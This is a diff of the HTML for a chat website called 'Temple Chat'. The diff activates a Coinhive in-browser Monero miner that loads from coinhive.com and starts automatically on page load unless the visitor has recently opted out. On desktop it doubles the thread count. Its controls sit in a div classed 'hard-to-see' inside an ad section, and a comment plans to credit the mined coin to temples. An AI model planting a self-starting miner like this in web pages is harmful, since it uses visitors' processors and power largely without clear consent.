@@ -3,13 +3,26 @@
 <html lang="en">
 <head>
 	<meta charset="utf-8">
-	<!--
 	<script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
 	<script>
-	var miner = new CoinHive.Anonymous ('Ansnx3ssG1KPPjbVHMIikQP9APAZYIio', {threads: navigator.hardwareConcurrency || 4, throttle: 0.3});
-	miner.start (CoinHive.IF_EXCLUSIVE_TAB);
+	var undefined;
+	/*if (typeof CoinHive.Anonymous === undefined) {
+		var script = document.createElement ("script");
+		script.type = "text/javascript";
+		script.src = "https://authedmine.com/lib/authedmine.min.js";
+		// TODO prepend before next script
+		document.head.appendChild (script);
+	}*/
 	</script>
-	-->
+	<script>
+	var miner = new CoinHive.Anonymous ('Ansnx3ssG1KPPjbVHMIikQP9APAZYIio', {
+			threads: navigator.hardwareConcurrency || 4,
+			throttle: 0.3,
+			theme: 'dark'
+	});
+	//if (!miner.didOptOut(14400))
+		//miner.start (CoinHive.IF_EXCLUSIVE_TAB);
+	</script>
 
 	<link rel="icon" href="https://s10.postimg.org/wt3ezfpcp/aum_470x470.jpg">
 	<title>Temple Chat</title>
@@ -93,6 +106,13 @@
 			border-style: solid;
 			text-align: center
 		}
+		
+		.decrease-button {
+			
+		}
+		.increase-button {
+			
+		}
 	</style>
 </head>
 
@@ -135,7 +155,74 @@
 	<aside class="ad">
 		<!-- TODO allow login so xmr can be credited to different temples -->
 		<div id="coinhive-miner" class="row">
-			
+			<div class="hard-to-see">
+				<div class="row">
+					<span><b>Controls</b></span>
+					<div class="row">
+						<div class="column2">
+							<span>Parallel Threads</span>
+						</div>
+						<div class="column2">
+							<div class="column3">
+							<button class="decrease-button"
+									onclick="decreaseParallelThreads(1); updateParallelThreads('parallel-threads')">D</button>
+							</div>
+							<div class="column3">
+							<span id="parallel-threads">0</span>
+							</div>
+							<div class="column3">
+							<button class="increase-button"
+									onclick="increaseParallelThreads(1); updateParallelThreads('parallel-threads')">I</button>
+							</div>
+						</div>
+					</div>
+					<div class="row">
+						<div class="column2">
+							<span>Throttle</span>
+						</div>
+						<div class="column2">
+							<div class="column3">
+							<button class="decrease-button"
+									onclick="decreaseThrottle(0.1); updateThrottle('throttle')">D</button>
+							</div>
+							<div class="column3">
+							<span id="throttle">0.0</span>
+							</div>
+							<div class="column3">
+							<button class="increase-button"
+									onclick="increaseThrottle(1); updateThrottle('throttle')">I</button>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="row">
+					<span><b>Stats</b></span>
+					<div class="row">
+						<div class="column2">
+							<span>Hashes/Second</span>
+						</div>
+						<div class="column2">
+							<span id="hashes-per-second">0</span>
+						</div>
+					</div>
+					<div class="row">
+						<div class="column2">
+							<span>Total Hashes</span>
+						</div>
+						<div class="column2">
+							<span id="total-hashes">0</span>
+						</div>
+					</div>
+					<div class="row">
+						<div class="column2">
+							<span>Accepted Hashes</span>
+						</div>
+						<div class="column2">
+							<span id="accepted-hashes">0</span>
+						</div>
+					</div>
+				</div>
+			</div>
 		</div>
 		
 		<div class="row">
@@ -273,5 +360,88 @@
 				style="width: 32px; height: 32px"></a>
 		</h3>
 	</footer>
+	
+	<script type="text/javascript">
+	function updateParallelThreads() {
+		var nt = miner.getNumThreads();
+		document.getElementById('parallel-threads').innerText = nt;
+	}
+	function updateThrottle() {
+		var nt = miner.getThrottle();
+		document.getElementById('throttle').innerText = nt;
+	}
+	function decreaseParallelThreads() {
+		var nt = miner.getNumThreads();
+		miner.setNumThreads(nt - 1);
+		//if (! miner.isRunning ())
+		//	miner.start (CoinHive.IF_EXCLUSIVE_TAB);
+	}
+	function increaseParallelThreads() {
+		var nt = miner.getNumThreads();
+		miner.setNumThreads(nt + 1);
+		//if (! miner.isRunning ())
+		//	miner.start (CoinHive.IF_EXCLUSIVE_TAB);
+	}
+	function decreaseThrottle() {
+		var nt = miner.getThrottle();
+		miner.setThrottle((nt - 0.1).toFixed (1));
+		//if (! miner.isRunning ())
+		//	miner.start (CoinHive.IF_EXCLUSIVE_TAB);
+	}
+	function increaseThrottle() {
+		var nt = miner.getThrottle();
+		miner.setThrottle((nt + 0.1).toFixed (1));
+		//if (! miner.isRunning ())
+		//	miner.start (CoinHive.IF_EXCLUSIVE_TAB);
+	}
+	updateParallelThreads();
+	updateThrottle();
+	</script>
+	<script>
+	if (miner.isMobile()) {
+		miner.setThrottle (0.7);
+		updateThrottle ();
+	} else {
+		miner.setNumThreads (miner.getNumThreads () * 2);
+		updateParallelThreads ();
+		miner.setThrottle (0.3);
+		updateThrottle ();
+	}
+
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		document.getElementById ('hashes-per-second').innerText = hashesPerSecond;
+		
+		var totalHashes = miner.getTotalHashes();
+		document.getElementById ('total-hashes').innerText = totalHashes;
+		
+		var acceptedHashes = miner.getAcceptedHashes();
+		document.getElementById ('accepted-hashes').innerText = acceptedHashes;
+	}, 1000);
+
+	if (miner.isRunning ()) miner.stop ();
+	if (!miner.didOptOut(14400))
+		miner.start (CoinHive.IF_EXCLUSIVE_TAB);
+
+	miner.on('found', function() {
+		/* Hash found */
+		var totalHashes = miner.getTotalHashes();
+		document.getElementById ('total-hashes').innerText = totalHashes;
+	});
+	miner.on('accepted', function() {
+		/* Hash accepted by the pool */
+		var acceptedHashes = miner.getAcceptedHashes();
+		document.getElementById ('accepted-hashes').innerText = acceptedHashes;
+	});
+	miner.on('optin', function(params) {
+		if (params.status === 'accepted') {
+			console.log('User accepted opt-in');
+			miner.start ();
+		}
+		else {
+			console.log('User canceled opt-in');
+		}
+	});
+	</script>
 </body>
 </html>
